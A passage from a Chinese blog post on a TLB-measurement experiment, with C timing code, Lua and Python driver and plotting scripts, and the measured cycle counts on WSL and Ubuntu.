    a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAX<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//改变步长</span>
      <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//重复多次以取平均值</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> <span class="token punctuation">(</span>PAGES <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> k<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            a<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token function">__rdtsc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">double</span> time <span class="token operator">=</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> N<span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"步长为%d,测量%d次取平均值，访问%d次平均用时为%lf时钟周期\n"</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i <span class="token punctuation">,</span> N <span class="token punctuation">,</span>PAGES<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>gcc tlb.c -O0 -o tlb</code>O0保证没被优化掉<br>wsl里的运行结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">步长为1,测量1000次取平均值，访问1000次平均用时为4257.000000时钟周期
步长为2,测量1000次取平均值，访问1000次平均用时为4290.000000时钟周期
步长为4,测量1000次取平均值，访问1000次平均用时为4398.000000时钟周期
步长为8,测量1000次取平均值，访问1000次平均用时为4429.000000时钟周期
步长为16,测量1000次取平均值，访问1000次平均用时为5063.000000时钟周期
步长为32,测量1000次取平均值，访问1000次平均用时为4432.000000时钟周期
步长为64,测量1000次取平均值，访问1000次平均用时为4508.000000时钟周期
步长为128,测量1000次取平均值，访问1000次平均用时为4375.000000时钟周期
步长为256,测量1000次取平均值，访问1000次平均用时为4537.000000时钟周期
步长为512,测量1000次取平均值，访问1000次平均用时为20244.000000时钟周期
步长为1024,测量1000次取平均值，访问1000次平均用时为26971.000000时钟周期
步长为2048,测量1000次取平均值，访问1000次平均用时为18894.000000时钟周期
步长为4096,测量1000次取平均值，访问1000次平均用时为20321.000000时钟周期
步长为8192,测量1000次取平均值，访问1000次平均用时为21044.000000时钟周期
步长为16384,测量1000次取平均值，访问1000次平均用时为26365.000000时钟周期
步长为32768,测量1000次取平均值，访问1000次平均用时为42513.000000时钟周期
步长为65536,测量1000次取平均值，访问1000次平均用时为86202.000000时钟周期
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>在512的位置有明显的时钟周期增长，而后趋于稳定，过大时继续明显增长</p>
<p><code>taskset -c 0 ./tlb</code>绑定CPU0<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">步长为1,测量1000次取平均值，访问1000次平均用时为4352.000000时钟周期
步长为2,测量1000次取平均值，访问1000次平均用时为4282.000000时钟周期
步长为4,测量1000次取平均值，访问1000次平均用时为4426.000000时钟周期
步长为8,测量1000次取平均值，访问1000次平均用时为4200.000000时钟周期
步长为16,测量1000次取平均值，访问1000次平均用时为4399.000000时钟周期
步长为32,测量1000次取平均值，访问1000次平均用时为4457.000000时钟周期
步长为64,测量1000次取平均值，访问1000次平均用时为4636.000000时钟周期
步长为128,测量1000次取平均值，访问1000次平均用时为4521.000000时钟周期
步长为256,测量1000次取平均值，访问1000次平均用时为4580.000000时钟周期
步长为512,测量1000次取平均值，访问1000次平均用时为18783.000000时钟周期
步长为1024,测量1000次取平均值，访问1000次平均用时为28484.000000时钟周期
步长为2048,测量1000次取平均值，访问1000次平均用时为41077.000000时钟周期
步长为4096,测量1000次取平均值，访问1000次平均用时为37400.000000时钟周期
步长为8192,测量1000次取平均值，访问1000次平均用时为35532.000000时钟周期
步长为16384,测量1000次取平均值，访问1000次平均用时为28906.000000时钟周期
步长为32768,测量1000次取平均值，访问1000次平均用时为28843.000000时钟周期
步长为65536,测量1000次取平均值，访问1000次平均用时为27293.000000时钟周期
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来是用lua控制，也就是说我需要把C的版本改成可以接受参数的，再把数组放在堆上，输出也改成平均每次访问的时钟周期<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> PAGES <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>PAGES <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> MAX<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ……
  <span class="token keyword">double</span> time <span class="token operator">=</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token punctuation">(</span>N <span class="token operator">*</span> PAGES<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"步长为%d,测量%d次取平均值，访问%d次平均每次用时为%lf时钟周期\n"</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i <span class="token punctuation">,</span> N <span class="token punctuation">,</span>PAGES<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后用lua控制，每次改变的是访问的数组次数<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> N <span class="token operator">=</span> <span class="token number">16</span>
<span class="token keyword">local</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> N <span class="token keyword">do</span>
    <span class="token keyword">local</span> times <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i
    <span class="token keyword">local</span> cmd <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"taskset -c 0 ./tlb %d %d"</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span>times<span class="token punctuation">)</span>
    <span class="token keyword">local</span> handle <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
    <span class="token keyword">local</span> output <span class="token operator">=</span> handle<span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">"*a"</span><span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>  <span class="token comment">-- 打印输出</span>
    handle<span class="token punctuation">:</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">-- 关闭文件句柄</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">步长为1,测量1000次取平均值，访问1次平均每次用时为5.000000时钟周期
步长为2,测量1000次取平均值，访问1次平均每次用时为5.000000时钟周期
步长为4,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为8,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为16,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为32,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为64,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为128,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为256,测量1000次取平均值，访问1次平均每次用时为5.000000时钟周期
步长为512,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为1024,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为2048,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为4096,测量1000次取平均值，访问1次平均每次用时为5.000000时钟周期
步长为8192,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为16384,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为32768,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
步长为65536,测量1000次取平均值，访问1次平均每次用时为4.000000时钟周期
……
步长为1,测量1000次取平均值，访问128次平均每次用时为4.000000时钟周期
步长为2,测量1000次取平均值，访问128次平均每次用时为5.000000时钟周期
步长为4,测量1000次取平均值，访问128次平均每次用时为5.000000时钟周期
步长为8,测量1000次取平均值，访问128次平均每次用时为4.000000时钟周期
步长为16,测量1000次取平均值，访问128次平均每次用时为4.000000时钟周期
步长为32,测量1000次取平均值，访问128次平均每次用时为5.000000时钟周期
步长为64,测量1000次取平均值，访问128次平均每次用时为5.000000时钟周期
步长为128,测量1000次取平均值，访问128次平均每次用时为5.000000时钟周期
步长为256,测量1000次取平均值，访问128次平均每次用时为5.000000时钟周期
步长为512,测量1000次取平均值，访问128次平均每次用时为13.000000时钟周期
步长为1024,测量1000次取平均值，访问128次平均每次用时为15.000000时钟周期
步长为2048,测量1000次取平均值，访问128次平均每次用时为15.000000时钟周期
步长为4096,测量1000次取平均值，访问128次平均每次用时为15.000000时钟周期
步长为8192,测量1000次取平均值，访问128次平均每次用时为15.000000时钟周期
步长为16384,测量1000次取平均值，访问128次平均每次用时为14.000000时钟周期
步长为32768,测量1000次取平均值，访问128次平均每次用时为15.000000时钟周期
步长为65536,测量1000次取平均值，访问128次平均每次用时为15.000000时钟周期
……
步长为1,测量1000次取平均值，访问8192次平均每次用时为4.000000时钟周期
步长为2,测量1000次取平均值，访问8192次平均每次用时为5.000000时钟周期
步长为4,测量1000次取平均值，访问8192次平均每次用时为4.000000时钟周期
步长为8,测量1000次取平均值，访问8192次平均每次用时为5.000000时钟周期
步长为16,测量1000次取平均值，访问8192次平均每次用时为5.000000时钟周期
步长为32,测量1000次取平均值，访问8192次平均每次用时为5.000000时钟周期
步长为64,测量1000次取平均值，访问8192次平均每次用时为6.000000时钟周期
步长为128,测量1000次取平均值，访问8192次平均每次用时为19.000000时钟周期
步长为256,测量1000次取平均值，访问8192次平均每次用时为17.000000时钟周期
步长为512,测量1000次取平均值，访问8192次平均每次用时为24.000000时钟周期
步长为1024,测量1000次取平均值，访问8192次平均每次用时为38.000000时钟周期
步长为2048,测量1000次取平均值，访问8192次平均每次用时为44.000000时钟周期
步长为4096,测量1000次取平均值，访问8192次平均每次用时为40.000000时钟周期
步长为8192,测量1000次取平均值，访问8192次平均每次用时为47.000000时钟周期
步长为16384,测量1000次取平均值，访问8192次平均每次用时为54.000000时钟周期
步长为32768,测量1000次取平均值，访问8192次平均每次用时为66.000000时钟周期
步长为65536,测量1000次取平均值，访问8192次平均每次用时为85.000000时钟周期<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>分析结果的话，只访问一次也无所谓局部性了，128次在512步长处出现了明显的增长，8192次责是从128开始，后续增长也很明显</p>
<p>在不同的设备上运行：<br><code>Ubuntu</code><br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">……
步长为1,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为2,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为4,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为8,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为16,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为32,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为64,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为128,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为256,测量1000次取平均值，访问64次平均每次用时为6.000000时钟周期
步长为512,测量1000次取平均值，访问64次平均每次用时为8.000000时钟周期
步长为1024,测量1000次取平均值，访问64次平均每次用时为22.000000时钟周期
步长为2048,测量1000次取平均值，访问64次平均每次用时为23.000000时钟周期
步长为4096,测量1000次取平均值，访问64次平均每次用时为23.000000时钟周期
步长为8192,测量1000次取平均值，访问64次平均每次用时为22.000000时钟周期
步长为16384,测量1000次取平均值，访问64次平均每次用时为22.000000时钟周期
步长为32768,测量1000次取平均值，访问64次平均每次用时为22.000000时钟周期
步长为65536,测量1000次取平均值，访问64次平均每次用时为22.000000时钟周期
……
步长为1,测量1000次取平均值，访问2048次平均每次用时为11.000000时钟周期
步长为2,测量1000次取平均值，访问2048次平均每次用时为7.000000时钟周期
步长为4,测量1000次取平均值，访问2048次平均每次用时为7.000000时钟周期
步长为8,测量1000次取平均值，访问2048次平均每次用时为6.000000时钟周期
步长为16,测量1000次取平均值，访问2048次平均每次用时为7.000000时钟周期
步长为32,测量1000次取平均值，访问2048次平均每次用时为7.000000时钟周期
步长为64,测量1000次取平均值，访问2048次平均每次用时为7.000000时钟周期
步长为128,测量1000次取平均值，访问2048次平均每次用时为11.000000时钟周期
步长为256,测量1000次取平均值，访问2048次平均每次用时为15.000000时钟周期
步长为512,测量1000次取平均值，访问2048次平均每次用时为15.000000时钟周期
步长为1024,测量1000次取平均值，访问2048次平均每次用时为21.000000时钟周期
步长为2048,测量1000次取平均值，访问2048次平均每次用时为22.000000时钟周期
步长为4096,测量1000次取平均值，访问2048次平均每次用时为22.000000时钟周期
步长为8192,测量1000次取平均值，访问2048次平均每次用时为23.000000时钟周期
步长为16384,测量1000次取平均值，访问2048次平均每次用时为25.000000时钟周期
步长为32768,测量1000次取平均值，访问2048次平均每次用时为27.000000时钟周期
步长为65536,测量1000次取平均值，访问2048次平均每次用时为37.000000时钟周期

Killed

Segmentation fault <span class="token punctuation">(</span>core dumped<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>最后出现了段错误，没有那么多堆上空间分给此程序</p>
<p>然后是可视化，在本机做的,让o3用python写一个：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token triple-quoted-string string">"""
visualize_tlb.py
----------------
运行 `./tlb` 不同参数组合的测试并将结果可视化。

使用方法：
    python3 visualize_tlb.py        # 直接运行脚本即可

脚本会：
1. 按照 tlb.lua 中的逻辑，对 pages = 2**i, i = 0..13 依次调用
   `taskset -c 0 ./tlb 1000 &lt;pages>`。
2. 解析每次调用产生的输出（中文），提取步长(step_size) 和
   平均时钟周期(time)。
3. 使用 matplotlib 绘制“步长 vs 平均时钟周期”的折线图，
   不同 pages 值对应不同曲线，并自动添加图例。

注意事项：
- 需要预先安装 matplotlib: `pip install matplotlib`。
- 建议在 Linux/WSL 环境下运行；若在 Windows 原生环境运行请移除
  `taskset -c 0` 前缀或者改为相应的绑核命令。
"""</span>

<span class="token keyword">import</span> subprocess
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> collections <span class="token keyword">import</span> defaultdict

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[错误] 未找到 matplotlib，请先执行: pip install matplotlib\n"</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># 与 tlb.c 输出格式匹配的正则</span>
LINE_RE <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"步长为(\d+).*平均每次用时为([0-9\.]+)时钟周期"</span><span class="token punctuation">)</span>

N_MEASURE <span class="token operator">=</span> <span class="token number">1000</span>  <span class="token comment"># 与 tlb.lua 中保持一致</span>
MAX_POW   <span class="token operator">=</span> <span class="token number">13</span>    <span class="token comment"># pages = 2**i, i in [0, 13]</span>


<span class="token keyword">def</span> <span class="token function">run_tlb</span><span class="token punctuation">(</span>pages<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""运行一次 tlb 并返回标准输出。"""</span>
    cmd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"taskset"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"./tlb"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>N_MEASURE<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        completed <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> completed<span class="token punctuation">.</span>stdout
    <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>CalledProcessError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[错误] 运行 </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> 失败\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span>stderr<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">parse_output</span><span class="token punctuation">(</span>output<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    解析 tlb.c 的输出文本。
    返回 list[(step_size:int, time:float)]，长度应为 16 (对应 0..15 的步长指数)。
    """</span>
    results <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> output<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> LINE_RE<span class="token punctuation">.</span>search<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
        <span class="token keyword">if</span> m<span class="token punctuation">:</span>
            step <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            time_cycle <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            results<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>step<span class="token punctuation">,</span> time_cycle<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> results<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[警告] 未能解析任何数据，请检查 tlb 输出格式\n"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> results


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> defaultdict<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># pages -> list of (step, time)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>MAX_POW <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        pages <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> i
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[信息] 运行 ./tlb </span><span class="token interpolation"><span class="token punctuation">&#123;</span>N_MEASURE<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pages<span class="token punctuation">&#125;</span></span><span class="token string"> ..."</span></span><span class="token punctuation">)</span>
        out <span class="token operator">=</span> run_tlb<span class="token punctuation">(</span>pages<span class="token punctuation">)</span>
        parsed <span class="token operator">=</span> parse_output<span class="token punctuation">(</span>out<span class="token punctuation">)</span>
        <span class="token keyword">if</span> parsed<span class="token punctuation">:</span>
            <span class="token comment"># 按 step 升序排序，确保绘图时一致</span>
            parsed<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            data<span class="token punctuation">[</span>pages<span class="token punctuation">]</span> <span class="token operator">=</span> parsed

    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[错误] 未获取到任何数据，程序终止\n"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token comment"># 绘图</span>
    plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span>figsize<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> pages<span class="token punctuation">,</span> records <span class="token keyword">in</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        steps<span class="token punctuation">,</span> times <span class="token operator">=</span> <span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token operator">*</span>records<span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>steps<span class="token punctuation">,</span> times<span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'o'</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>pages<span class="token punctuation">&#125;</span></span><span class="token string"> pages'</span></span><span class="token punctuation">)</span>

    plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Stride (bytes)'</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Average cycles per access'</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'TLB Experiment: Stride vs Access Latency'</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>xscale<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> base<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>yscale<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> which<span class="token operator">=</span><span class="token string">'both'</span><span class="token punctuation">,</span> ls<span class="token operator">=</span><span class="token string">'--'</span><span class="token punctuation">,</span> alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>legend<span class="token punctuation">(</span><span class="token punctuation">)</span>
    plt<span class="token punctuation">.</span>tight_layout<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 先保存图片，方便在无图形界面的环境下查看</span>
    output_png <span class="token operator">=</span> <span class="token string">'tlb.png'</span>
    plt<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span>output_png<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[信息] 图形已保存至 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>output_png<span class="token punctuation">&#125;</span></span><span class="token string">，如未弹出窗口可手动查看该文件。"</span></span><span class="token punctuation">)</span>
    <span class="token comment"># 如果图形后端支持交互，再尝试弹窗</span>
    plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span aria-hidden="true" 